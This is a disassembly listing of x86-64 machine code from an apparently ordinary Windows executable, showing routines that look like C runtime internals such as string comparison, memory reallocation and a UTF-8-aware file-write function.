   14000bdfb:	85 c0                	test   %eax,%eax
   14000bdfd:	75 11                	jne    0x14000be10
   14000bdff:	48 8b 4d 27          	mov    0x27(%rbp),%rcx
   14000be03:	48 8b d7             	mov    %rdi,%rdx
   14000be06:	ff 15 ec 43 00 00    	call   *0x43ec(%rip)        # 0x1400101f8
   14000be0c:	8b d8                	mov    %eax,%ebx
   14000be0e:	eb 03                	jmp    0x14000be13
   14000be10:	41 8b df             	mov    %r15d,%ebx
   14000be13:	44 38 7d 0f          	cmp    %r15b,0xf(%rbp)
   14000be17:	74 08                	je     0x14000be21
   14000be19:	48 8b cf             	mov    %rdi,%rcx
   14000be1c:	e8 2b ae ff ff       	call   0x140006c4c
   14000be21:	44 38 7d 3f          	cmp    %r15b,0x3f(%rbp)
   14000be25:	74 09                	je     0x14000be30
   14000be27:	48 8b 4d 27          	mov    0x27(%rbp),%rcx
   14000be2b:	e8 1c ae ff ff       	call   0x140006c4c
   14000be30:	4c 8d 9c 24 a0 00 00 	lea    0xa0(%rsp),%r11
   14000be37:	00 
   14000be38:	8b c3                	mov    %ebx,%eax
   14000be3a:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000be3e:	49 8b 73 28          	mov    0x28(%r11),%rsi
   14000be42:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   14000be46:	49 8b e3             	mov    %r11,%rsp
   14000be49:	41 5f                	pop    %r15
   14000be4b:	41 5e                	pop    %r14
   14000be4d:	5d                   	pop    %rbp
   14000be4e:	c3                   	ret
   14000be4f:	cc                   	int3
   14000be50:	4c 8b da             	mov    %rdx,%r11
   14000be53:	4c 8b d1             	mov    %rcx,%r10
   14000be56:	4d 85 c0             	test   %r8,%r8
   14000be59:	75 03                	jne    0x14000be5e
   14000be5b:	33 c0                	xor    %eax,%eax
   14000be5d:	c3                   	ret
   14000be5e:	41 0f b7 0a          	movzwl (%r10),%ecx
   14000be62:	4d 8d 52 02          	lea    0x2(%r10),%r10
   14000be66:	41 0f b7 13          	movzwl (%r11),%edx
   14000be6a:	4d 8d 5b 02          	lea    0x2(%r11),%r11
   14000be6e:	8d 41 bf             	lea    -0x41(%rcx),%eax
   14000be71:	83 f8 19             	cmp    $0x19,%eax
   14000be74:	44 8d 49 20          	lea    0x20(%rcx),%r9d
   14000be78:	8d 42 bf             	lea    -0x41(%rdx),%eax
   14000be7b:	44 0f 47 c9          	cmova  %ecx,%r9d
   14000be7f:	83 f8 19             	cmp    $0x19,%eax
   14000be82:	8d 4a 20             	lea    0x20(%rdx),%ecx
   14000be85:	41 8b c1             	mov    %r9d,%eax
   14000be88:	0f 47 ca             	cmova  %edx,%ecx
   14000be8b:	2b c1                	sub    %ecx,%eax
   14000be8d:	75 0b                	jne    0x14000be9a
   14000be8f:	45 85 c9             	test   %r9d,%r9d
   14000be92:	74 06                	je     0x14000be9a
   14000be94:	49 83 e8 01          	sub    $0x1,%r8
   14000be98:	75 c4                	jne    0x14000be5e
   14000be9a:	c3                   	ret
   14000be9b:	cc                   	int3
   14000be9c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000bea1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000bea6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000beab:	57                   	push   %rdi
   14000beac:	41 56                	push   %r14
   14000beae:	41 57                	push   %r15
   14000beb0:	48 83 ec 20          	sub    $0x20,%rsp
   14000beb4:	48 8b e9             	mov    %rcx,%rbp
   14000beb7:	48 85 c9             	test   %rcx,%rcx
   14000beba:	74 47                	je     0x14000bf03
   14000bebc:	33 db                	xor    %ebx,%ebx
   14000bebe:	4c 8d 3d 3b 41 ff ff 	lea    -0xbec5(%rip),%r15        # 0x140000000
   14000bec5:	bf e3 00 00 00       	mov    $0xe3,%edi
   14000beca:	8d 04 1f             	lea    (%rdi,%rbx,1),%eax
   14000becd:	41 b8 55 00 00 00    	mov    $0x55,%r8d
   14000bed3:	99                   	cltd
   14000bed4:	48 8b cd             	mov    %rbp,%rcx
   14000bed7:	2b c2                	sub    %edx,%eax
   14000bed9:	d1 f8                	sar    $1,%eax
   14000bedb:	48 63 f0             	movslq %eax,%rsi
   14000bede:	4c 8b f6             	mov    %rsi,%r14
   14000bee1:	4d 03 f6             	add    %r14,%r14
   14000bee4:	4b 8b 94 f7 00 45 01 	mov    0x14500(%r15,%r14,8),%rdx
   14000beeb:	00 
   14000beec:	e8 5f ff ff ff       	call   0x14000be50
   14000bef1:	85 c0                	test   %eax,%eax
   14000bef3:	74 29                	je     0x14000bf1e
   14000bef5:	79 05                	jns    0x14000befc
   14000bef7:	8d 7e ff             	lea    -0x1(%rsi),%edi
   14000befa:	eb 03                	jmp    0x14000beff
   14000befc:	8d 5e 01             	lea    0x1(%rsi),%ebx
   14000beff:	3b df                	cmp    %edi,%ebx
   14000bf01:	7e c7                	jle    0x14000beca
   14000bf03:	33 c0                	xor    %eax,%eax
   14000bf05:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000bf0a:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000bf0f:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000bf14:	48 83 c4 20          	add    $0x20,%rsp
   14000bf18:	41 5f                	pop    %r15
   14000bf1a:	41 5e                	pop    %r14
   14000bf1c:	5f                   	pop    %rdi
   14000bf1d:	c3                   	ret
   14000bf1e:	4b 63 84 f7 08 45 01 	movslq 0x14508(%r15,%r14,8),%rax
   14000bf25:	00 
   14000bf26:	85 c0                	test   %eax,%eax
   14000bf28:	78 d9                	js     0x14000bf03
   14000bf2a:	48 3d e4 00 00 00    	cmp    $0xe4,%rax
   14000bf30:	73 d1                	jae    0x14000bf03
   14000bf32:	48 03 c0             	add    %rax,%rax
   14000bf35:	41 8b 84 c7 a0 2a 01 	mov    0x12aa0(%r15,%rax,8),%eax
   14000bf3c:	00 
   14000bf3d:	eb c6                	jmp    0x14000bf05
   14000bf3f:	cc                   	int3
   14000bf40:	48 83 ec 28          	sub    $0x28,%rsp
   14000bf44:	48 85 c9             	test   %rcx,%rcx
   14000bf47:	75 19                	jne    0x14000bf62
   14000bf49:	e8 66 ac ff ff       	call   0x140006bb4
   14000bf4e:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000bf54:	e8 1f ab ff ff       	call   0x140006a78
   14000bf59:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000bf5d:	48 83 c4 28          	add    $0x28,%rsp
   14000bf61:	c3                   	ret
   14000bf62:	4c 8b c1             	mov    %rcx,%r8
   14000bf65:	33 d2                	xor    %edx,%edx
   14000bf67:	48 8b 0d 82 fc 00 00 	mov    0xfc82(%rip),%rcx        # 0x14001bbf0
   14000bf6e:	48 83 c4 28          	add    $0x28,%rsp
   14000bf72:	48 ff 25 cf 40 00 00 	rex.W jmp *0x40cf(%rip)        # 0x140010048
   14000bf79:	cc                   	int3
   14000bf7a:	cc                   	int3
   14000bf7b:	cc                   	int3
   14000bf7c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000bf81:	57                   	push   %rdi
   14000bf82:	48 83 ec 20          	sub    $0x20,%rsp
   14000bf86:	48 8b da             	mov    %rdx,%rbx
   14000bf89:	48 8b f9             	mov    %rcx,%rdi
   14000bf8c:	48 85 c9             	test   %rcx,%rcx
   14000bf8f:	75 0a                	jne    0x14000bf9b
   14000bf91:	48 8b ca             	mov    %rdx,%rcx
   14000bf94:	e8 0f d6 ff ff       	call   0x1400095a8
   14000bf99:	eb 1f                	jmp    0x14000bfba
   14000bf9b:	48 85 db             	test   %rbx,%rbx
   14000bf9e:	75 07                	jne    0x14000bfa7
   14000bfa0:	e8 a7 ac ff ff       	call   0x140006c4c
   14000bfa5:	eb 11                	jmp    0x14000bfb8
   14000bfa7:	48 83 fb e0          	cmp    $0xffffffffffffffe0,%rbx
   14000bfab:	76 2d                	jbe    0x14000bfda
   14000bfad:	e8 02 ac ff ff       	call   0x140006bb4
   14000bfb2:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   14000bfb8:	33 c0                	xor    %eax,%eax
   14000bfba:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000bfbf:	48 83 c4 20          	add    $0x20,%rsp
   14000bfc3:	5f                   	pop    %rdi
   14000bfc4:	c3                   	ret
   14000bfc5:	e8 de 97 ff ff       	call   0x1400057a8
   14000bfca:	85 c0                	test   %eax,%eax
   14000bfcc:	74 df                	je     0x14000bfad
   14000bfce:	48 8b cb             	mov    %rbx,%rcx
   14000bfd1:	e8 fa e2 ff ff       	call   0x14000a2d0
   14000bfd6:	85 c0                	test   %eax,%eax
   14000bfd8:	74 d3                	je     0x14000bfad
   14000bfda:	48 8b 0d 0f fc 00 00 	mov    0xfc0f(%rip),%rcx        # 0x14001bbf0
   14000bfe1:	4c 8b cb             	mov    %rbx,%r9
   14000bfe4:	4c 8b c7             	mov    %rdi,%r8
   14000bfe7:	33 d2                	xor    %edx,%edx
   14000bfe9:	ff 15 51 40 00 00    	call   *0x4051(%rip)        # 0x140010040
   14000bfef:	48 85 c0             	test   %rax,%rax
   14000bff2:	74 d1                	je     0x14000bfc5
   14000bff4:	eb c4                	jmp    0x14000bfba
   14000bff6:	cc                   	int3
   14000bff7:	cc                   	int3
   14000bff8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000bffd:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000c002:	57                   	push   %rdi
   14000c003:	48 83 ec 20          	sub    $0x20,%rsp
   14000c007:	49 8b f9             	mov    %r9,%rdi
   14000c00a:	49 8b d8             	mov    %r8,%rbx
   14000c00d:	8b 0a                	mov    (%rdx),%ecx
   14000c00f:	e8 cc ce ff ff       	call   0x140008ee0
   14000c014:	90                   	nop
   14000c015:	48 8b 03             	mov    (%rbx),%rax
   14000c018:	48 63 08             	movslq (%rax),%rcx
   14000c01b:	48 8b d1             	mov    %rcx,%rdx
   14000c01e:	48 8b c1             	mov    %rcx,%rax
   14000c021:	48 c1 f8 06          	sar    $0x6,%rax
   14000c025:	4c 8d 05 04 f6 00 00 	lea    0xf604(%rip),%r8        # 0x14001b630
   14000c02c:	83 e2 3f             	and    $0x3f,%edx
   14000c02f:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000c033:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000c037:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   14000c03c:	74 23                	je     0x14000c061
   14000c03e:	e8 a9 cf ff ff       	call   0x140008fec
   14000c043:	48 8b c8             	mov    %rax,%rcx
   14000c046:	ff 15 ec 3f 00 00    	call   *0x3fec(%rip)        # 0x140010038
   14000c04c:	33 db                	xor    %ebx,%ebx
   14000c04e:	85 c0                	test   %eax,%eax
   14000c050:	75 1d                	jne    0x14000c06f
   14000c052:	ff 15 80 40 00 00    	call   *0x4080(%rip)        # 0x1400100d8
   14000c058:	8b d8                	mov    %eax,%ebx
   14000c05a:	e8 35 ab ff ff       	call   0x140006b94
   14000c05f:	89 18                	mov    %ebx,(%rax)
   14000c061:	e8 4e ab ff ff       	call   0x140006bb4
   14000c066:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000c06c:	83 cb ff             	or     $0xffffffff,%ebx
   14000c06f:	8b 0f                	mov    (%rdi),%ecx
   14000c071:	e8 92 ce ff ff       	call   0x140008f08
   14000c076:	8b c3                	mov    %ebx,%eax
   14000c078:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000c07d:	48 83 c4 20          	add    $0x20,%rsp
   14000c081:	5f                   	pop    %rdi
   14000c082:	c3                   	ret
   14000c083:	cc                   	int3
   14000c084:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000c088:	48 83 ec 38          	sub    $0x38,%rsp
   14000c08c:	48 63 d1             	movslq %ecx,%rdx
   14000c08f:	83 fa fe             	cmp    $0xfffffffe,%edx
   14000c092:	75 0d                	jne    0x14000c0a1
   14000c094:	e8 1b ab ff ff       	call   0x140006bb4
   14000c099:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000c09f:	eb 6c                	jmp    0x14000c10d
   14000c0a1:	85 c9                	test   %ecx,%ecx
   14000c0a3:	78 58                	js     0x14000c0fd
   14000c0a5:	3b 15 85 f9 00 00    	cmp    0xf985(%rip),%edx        # 0x14001ba30
   14000c0ab:	73 50                	jae    0x14000c0fd
   14000c0ad:	48 8b ca             	mov    %rdx,%rcx
   14000c0b0:	4c 8d 05 79 f5 00 00 	lea    0xf579(%rip),%r8        # 0x14001b630
   14000c0b7:	83 e1 3f             	and    $0x3f,%ecx
   14000c0ba:	48 8b c2             	mov    %rdx,%rax
   14000c0bd:	48 c1 f8 06          	sar    $0x6,%rax
   14000c0c1:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000c0c5:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000c0c9:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   14000c0ce:	74 2d                	je     0x14000c0fd
   14000c0d0:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000c0d5:	89 54 24 50          	mov    %edx,0x50(%rsp)
   14000c0d9:	89 54 24 58          	mov    %edx,0x58(%rsp)
   14000c0dd:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   14000c0e2:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   14000c0e7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000c0ec:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000c0f1:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000c0f6:	e8 fd fe ff ff       	call   0x14000bff8
   14000c0fb:	eb 13                	jmp    0x14000c110
   14000c0fd:	e8 b2 aa ff ff       	call   0x140006bb4
   14000c102:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000c108:	e8 6b a9 ff ff       	call   0x140006a78
   14000c10d:	83 c8 ff             	or     $0xffffffff,%eax
   14000c110:	48 83 c4 38          	add    $0x38,%rsp
   14000c114:	c3                   	ret
   14000c115:	cc                   	int3
   14000c116:	cc                   	int3
   14000c117:	cc                   	int3
   14000c118:	48 8b c4             	mov    %rsp,%rax
   14000c11b:	55                   	push   %rbp
   14000c11c:	56                   	push   %rsi
   14000c11d:	57                   	push   %rdi
   14000c11e:	41 54                	push   %r12
   14000c120:	41 55                	push   %r13
   14000c122:	41 56                	push   %r14
   14000c124:	41 57                	push   %r15
   14000c126:	48 8d 68 a9          	lea    -0x57(%rax),%rbp
   14000c12a:	48 81 ec d0 00 00 00 	sub    $0xd0,%rsp
   14000c131:	48 c7 45 f7 fe ff ff 	movq   $0xfffffffffffffffe,-0x9(%rbp)
   14000c138:	ff 
   14000c139:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000c13d:	48 8b 05 bc de 00 00 	mov    0xdebc(%rip),%rax        # 0x14001a000
   14000c144:	48 33 c4             	xor    %rsp,%rax
   14000c147:	48 89 45 17          	mov    %rax,0x17(%rbp)
   14000c14b:	49 8b f0             	mov    %r8,%rsi
   14000c14e:	4c 89 45 bf          	mov    %r8,-0x41(%rbp)
   14000c152:	4c 63 f2             	movslq %edx,%r14
   14000c155:	48 8b d9             	mov    %rcx,%rbx
   14000c158:	48 8b 45 7f          	mov    0x7f(%rbp),%rax
   14000c15c:	48 89 45 a7          	mov    %rax,-0x59(%rbp)
   14000c160:	49 8b c6             	mov    %r14,%rax
   14000c163:	4d 8b ee             	mov    %r14,%r13
   14000c166:	49 c1 fd 06          	sar    $0x6,%r13
   14000c16a:	4c 89 6d c7          	mov    %r13,-0x39(%rbp)
   14000c16e:	48 8d 0d 8b 3e ff ff 	lea    -0xc175(%rip),%rcx        # 0x140000000
   14000c175:	83 e0 3f             	and    $0x3f,%eax
   14000c178:	4c 8d 3c c0          	lea    (%rax,%rax,8),%r15
   14000c17c:	4a 8b 84 e9 30 b6 01 	mov    0x1b630(%rcx,%r13,8),%rax
   14000c183:	00 
   14000c184:	4a 8b 44 f8 28       	mov    0x28(%rax,%r15,8),%rax
   14000c189:	48 89 45 e7          	mov    %rax,-0x19(%rbp)
   14000c18d:	45 8b e1             	mov    %r9d,%r12d
   14000c190:	4d 03 e0             	add    %r8,%r12
   14000c193:	4c 89 65 9f          	mov    %r12,-0x61(%rbp)
   14000c197:	ff 15 93 3e 00 00    	call   *0x3e93(%rip)        # 0x140010030
   14000c19d:	89 45 b7             	mov    %eax,-0x49(%rbp)
   14000c1a0:	33 ff                	xor    %edi,%edi
   14000c1a2:	4c 8b 55 a7          	mov    -0x59(%rbp),%r10
   14000c1a6:	41 38 7a 28          	cmp    %dil,0x28(%r10)
   14000c1aa:	75 0c                	jne    0x14000c1b8
   14000c1ac:	49 8b ca             	mov    %r10,%rcx
   14000c1af:	e8 2c 9d ff ff       	call   0x140005ee0
   14000c1b4:	4c 8b 55 a7          	mov    -0x59(%rbp),%r10
   14000c1b8:	49 8b 4a 18          	mov    0x18(%r10),%rcx
   14000c1bc:	8b 49 0c             	mov    0xc(%rcx),%ecx
   14000c1bf:	89 4d bb             	mov    %ecx,-0x45(%rbp)
   14000c1c2:	33 c0                	xor    %eax,%eax
   14000c1c4:	48 89 03             	mov    %rax,(%rbx)
   14000c1c7:	89 43 08             	mov    %eax,0x8(%rbx)
   14000c1ca:	4c 39 65 bf          	cmp    %r12,-0x41(%rbp)
   14000c1ce:	0f 83 8f 03 00 00    	jae    0x14000c563
   14000c1d4:	4d 8b ce             	mov    %r14,%r9
   14000c1d7:	49 c1 f9 06          	sar    $0x6,%r9
   14000c1db:	4c 89 4d ef          	mov    %r9,-0x11(%rbp)
   14000c1df:	8b d7                	mov    %edi,%edx
   14000c1e1:	8a 06                	mov    (%rsi),%al
   14000c1e3:	88 45 8f             	mov    %al,-0x71(%rbp)
   14000c1e6:	89 7d 93             	mov    %edi,-0x6d(%rbp)
   14000c1e9:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   14000c1ef:	4c 8d 1d 0a 3e ff ff 	lea    -0xc1f6(%rip),%r11        # 0x140000000
   14000c1f6:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   14000c1fc:	0f 85 7b 01 00 00    	jne    0x14000c37d
   14000c202:	8b d7                	mov    %edi,%edx
   14000c204:	4c 8b f7             	mov    %rdi,%r14
   14000c207:	4a 8d 0c fd 3e 00 00 	lea    0x3e(,%r15,8),%rcx
   14000c20e:	00 
   14000c20f:	4b 03 8c cb 30 b6 01 	add    0x1b630(%r11,%r9,8),%rcx
   14000c216:	00 
   14000c217:	40 38 39             	cmp    %dil,(%rcx)
   14000c21a:	74 0e                	je     0x14000c22a
   14000c21c:	ff c2                	inc    %edx
   14000c21e:	49 ff c6             	inc    %r14
   14000c221:	48 ff c1             	inc    %rcx
   14000c224:	49 83 fe 05          	cmp    $0x5,%r14
   14000c228:	7c ed                	jl     0x14000c217
   14000c22a:	4d 85 f6             	test   %r14,%r14
   14000c22d:	0f 8e e0 00 00 00    	jle    0x14000c313
   14000c233:	4b 8b 84 eb 30 b6 01 	mov    0x1b630(%r11,%r13,8),%rax
   14000c23a:	00 
   14000c23b:	42 0f b6 4c f8 3e    	movzbl 0x3e(%rax,%r15,8),%ecx
   14000c241:	46 0f be a4 19 10 a9 	movsbl 0x1a910(%rcx,%r11,1),%r12d
   14000c248:	01 00 
   14000c24a:	41 ff c4             	inc    %r12d
   14000c24d:	41 8b c4             	mov    %r12d,%eax
   14000c250:	2b c2                	sub    %edx,%eax
   14000c252:	89 45 af             	mov    %eax,-0x51(%rbp)
   14000c255:	48 8b 55 9f          	mov    -0x61(%rbp),%rdx
   14000c259:	48 2b d6             	sub    %rsi,%rdx
   14000c25c:	4c 63 c0             	movslq %eax,%r8
   14000c25f:	4c 3b c2             	cmp    %rdx,%r8
   14000c262:	0f 8f 78 02 00 00    	jg     0x14000c4e0
   14000c268:	48 8b cf             	mov    %rdi,%rcx
   14000c26b:	4a 8d 14 fd 3e 00 00 	lea    0x3e(,%r15,8),%rdx
   14000c272:	00 
   14000c273:	4b 03 94 cb 30 b6 01 	add    0x1b630(%r11,%r9,8),%rdx
   14000c27a:	00 
   14000c27b:	8a 02                	mov    (%rdx),%al
   14000c27d:	88 44 0d ff          	mov    %al,-0x1(%rbp,%rcx,1)
   14000c281:	48 ff c1             	inc    %rcx
   14000c284:	48 ff c2             	inc    %rdx
   14000c287:	49 3b ce             	cmp    %r14,%rcx
   14000c28a:	7c ef                	jl     0x14000c27b
   14000c28c:	4d 85 c0             	test   %r8,%r8
   14000c28f:	7e 1a                	jle    0x14000c2ab
   14000c291:	48 8d 4d ff          	lea    -0x1(%rbp),%rcx
   14000c295:	49 03 ce             	add    %r14,%rcx
   14000c298:	48 8b d6             	mov    %rsi,%rdx
   14000c29b:	e8 90 30 00 00       	call   0x14000f330
   14000c2a0:	4c 8b 55 a7          	mov    -0x59(%rbp),%r10
   14000c2a4:	4c 8d 1d 55 3d ff ff 	lea    -0xc2ab(%rip),%r11        # 0x140000000
   14000c2ab:	48 8b d7             	mov    %rdi,%rdx
   14000c2ae:	4b 8b 8c eb 30 b6 01 	mov    0x1b630(%r11,%r13,8),%rcx
   14000c2b5:	00 
   14000c2b6:	48 03 ca             	add    %rdx,%rcx
   14000c2b9:	42 88 7c f9 3e       	mov    %dil,0x3e(%rcx,%r15,8)
   14000c2be:	48 ff c2             	inc    %rdx
   14000c2c1:	49 3b d6             	cmp    %r14,%rdx
   14000c2c4:	7c e8                	jl     0x14000c2ae
   14000c2c6:	48 89 7d cf          	mov    %rdi,-0x31(%rbp)
   14000c2ca:	48 8d 45 ff          	lea    -0x1(%rbp),%rax
   14000c2ce:	48 89 45 d7          	mov    %rax,-0x29(%rbp)
   14000c2d2:	8b c7                	mov    %edi,%eax
   14000c2d4:	41 83 fc 04          	cmp    $0x4,%r12d
   14000c2d8:	0f 94 c0             	sete   %al
   14000c2db:	ff c0                	inc    %eax
   14000c2dd:	44 8b e0             	mov    %eax,%r12d
   14000c2e0:	44 8b c0             	mov    %eax,%r8d
   14000c2e3:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   14000c2e8:	4c 8d 4d cf          	lea    -0x31(%rbp),%r9
   14000c2ec:	48 8d 55 d7          	lea    -0x29(%rbp),%rdx
   14000c2f0:	48 8d 4d 93          	lea    -0x6d(%rbp),%rcx
   14000c2f4:	e8 eb 0b 00 00       	call   0x14000cee4
   14000c2f9:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000c2fd:	0f 84 60 02 00 00    	je     0x14000c563
   14000c303:	8b 45 af             	mov    -0x51(%rbp),%eax
   14000c306:	ff c8                	dec    %eax
   14000c308:	48 63 c8             	movslq %eax,%rcx
   14000c30b:	48 03 f1             	add    %rcx,%rsi
   14000c30e:	e9 fb 00 00 00       	jmp    0x14000c40e
   14000c313:	0f b6 06             	movzbl (%rsi),%eax
   14000c316:	4e 0f be ac 18 10 a9 	movsbq 0x1a910(%rax,%r11,1),%r13
   14000c31d:	01 00 
   14000c31f:	41 8d 4d 01          	lea    0x1(%r13),%ecx
   14000c323:	4c 8b 45 9f          	mov    -0x61(%rbp),%r8
   14000c327:	4c 2b c6             	sub    %rsi,%r8
   14000c32a:	48 63 c1             	movslq %ecx,%rax
   14000c32d:	49 3b c0             	cmp    %r8,%rax
   14000c330:	0f 8f d8 01 00 00    	jg     0x14000c50e
   14000c336:	48 89 7d af          	mov    %rdi,-0x51(%rbp)
   14000c33a:	48 89 75 df          	mov    %rsi,-0x21(%rbp)
   14000c33e:	8b c7                	mov    %edi,%eax
   14000c340:	83 f9 04             	cmp    $0x4,%ecx
   14000c343:	0f 94 c0             	sete   %al
   14000c346:	ff c0                	inc    %eax
   14000c348:	44 8b f0             	mov    %eax,%r14d
   14000c34b:	44 8b c0             	mov    %eax,%r8d
   14000c34e:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   14000c353:	4c 8d 4d af          	lea    -0x51(%rbp),%r9
   14000c357:	48 8d 55 df          	lea    -0x21(%rbp),%rdx
   14000c35b:	48 8d 4d 93          	lea    -0x6d(%rbp),%rcx
   14000c35f:	e8 80 0b 00 00       	call   0x14000cee4
   14000c364:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000c368:	0f 84 f5 01 00 00    	je     0x14000c563
   14000c36e:	49 03 f5             	add    %r13,%rsi
   14000c371:	45 8b e6             	mov    %r14d,%r12d
   14000c374:	4c 8b 6d c7          	mov    -0x39(%rbp),%r13
   14000c378:	e9 91 00 00 00       	jmp    0x14000c40e
   14000c37d:	4f 8b 84 eb 30 b6 01 	mov    0x1b630(%r11,%r13,8),%r8
   14000c384:	00 
   14000c385:	43 8a 4c f8 3d       	mov    0x3d(%r8,%r15,8),%cl
   14000c38a:	f6 c1 04             	test   $0x4,%cl
   14000c38d:	74 21                	je     0x14000c3b0
   14000c38f:	43 8a 44 f8 3e       	mov    0x3e(%r8,%r15,8),%al
   14000c394:	88 45 07             	mov    %al,0x7(%rbp)
   14000c397:	8a 06                	mov    (%rsi),%al
   14000c399:	88 45 08             	mov    %al,0x8(%rbp)
   14000c39c:	80 e1 fb             	and    $0xfb,%cl
   14000c39f:	43 88 4c f8 3d       	mov    %cl,0x3d(%r8,%r15,8)
   14000c3a4:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000c3aa:	48 8d 55 07          	lea    0x7(%rbp),%rdx
   14000c3ae:	eb 49                	jmp    0x14000c3f9
   14000c3b0:	44 0f b6 0e          	movzbl (%rsi),%r9d
   14000c3b4:	49 8b 42 18          	mov    0x18(%r10),%rax
   14000c3b8:	48 8b 08             	mov    (%rax),%rcx
   14000c3bb:	66 42 39 3c 49       	cmp    %di,(%rcx,%r9,2)
   14000c3c0:	7d 31                	jge    0x14000c3f3
   14000c3c2:	4c 8d 76 01          	lea    0x1(%rsi),%r14
   14000c3c6:	4c 3b 75 9f          	cmp    -0x61(%rbp),%r14
   14000c3ca:	0f 83 70 01 00 00    	jae    0x14000c540
   14000c3d0:	4d 8b ca             	mov    %r10,%r9
   14000c3d3:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000c3d9:	48 8b d6             	mov    %rsi,%rdx
   14000c3dc:	48 8d 4d 93          	lea    -0x6d(%rbp),%rcx
   14000c3e0:	e8 2b e8 ff ff       	call   0x14000ac10
   14000c3e5:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000c3e8:	0f 84 75 01 00 00    	je     0x14000c563
   14000c3ee:	49 8b f6             	mov    %r14,%rsi
   14000c3f1:	eb 1b                	jmp    0x14000c40e
   14000c3f3:	4d 8b c4             	mov    %r12,%r8
   14000c3f6:	48 8b d6             	mov    %rsi,%rdx
   14000c3f9:	4d 8b ca             	mov    %r10,%r9
   14000c3fc:	48 8d 4d 93          	lea    -0x6d(%rbp),%rcx
   14000c400:	e8 0b e8 ff ff       	call   0x14000ac10
   14000c405:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000c408:	0f 84 55 01 00 00    	je     0x14000c563
   14000c40e:	48 ff c6             	inc    %rsi
   14000c411:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   14000c416:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   14000c41b:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   14000c422:	00 
   14000c423:	48 8d 45 0f          	lea    0xf(%rbp),%rax
   14000c427:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000c42c:	45 8b cc             	mov    %r12d,%r9d
   14000c42f:	4c 8d 45 93          	lea    -0x6d(%rbp),%r8
   14000c433:	33 d2                	xor    %edx,%edx
   14000c435:	8b 4d b7             	mov    -0x49(%rbp),%ecx
   14000c438:	e8 af c1 ff ff       	call   0x1400085ec
   14000c43d:	44 8b f0             	mov    %eax,%r14d
   14000c440:	85 c0                	test   %eax,%eax
   14000c442:	0f 84 1b 01 00 00    	je     0x14000c563
   14000c448:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000c44d:	4c 8d 4d 97          	lea    -0x69(%rbp),%r9
   14000c451:	44 8b c0             	mov    %eax,%r8d
   14000c454:	48 8d 55 0f          	lea    0xf(%rbp),%rdx
   14000c458:	4c 8b 65 e7          	mov    -0x19(%rbp),%r12
   14000c45c:	49 8b cc             	mov    %r12,%rcx
   14000c45f:	ff 15 fb 3c 00 00    	call   *0x3cfb(%rip)        # 0x140010160
   14000c465:	85 c0                	test   %eax,%eax
   14000c467:	0f 84 ee 00 00 00    	je     0x14000c55b
   14000c46d:	8b d6                	mov    %esi,%edx
   14000c46f:	2b 55 bf             	sub    -0x41(%rbp),%edx
   14000c472:	03 53 08             	add    0x8(%rbx),%edx
   14000c475:	89 53 04             	mov    %edx,0x4(%rbx)
   14000c478:	44 39 75 97          	cmp    %r14d,-0x69(%rbp)
   14000c47c:	0f 82 e1 00 00 00    	jb     0x14000c563
   14000c482:	80 7d 8f 0a          	cmpb   $0xa,-0x71(%rbp)
   14000c486:	75 3e                	jne    0x14000c4c6
   14000c488:	b8 0d 00 00 00       	mov    $0xd,%eax
   14000c48d:	66 89 45 8f          	mov    %ax,-0x71(%rbp)
   14000c491:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000c496:	4c 8d 4d 97          	lea    -0x69(%rbp),%r9
   14000c49a:	44 8d 40 f4          	lea    -0xc(%rax),%r8d
   14000c49e:	48 8d 55 8f          	lea    -0x71(%rbp),%rdx
   14000c4a2:	49 8b cc             	mov    %r12,%rcx
   14000c4a5:	ff 15 b5 3c 00 00    	call   *0x3cb5(%rip)        # 0x140010160
   14000c4ab:	85 c0                	test   %eax,%eax
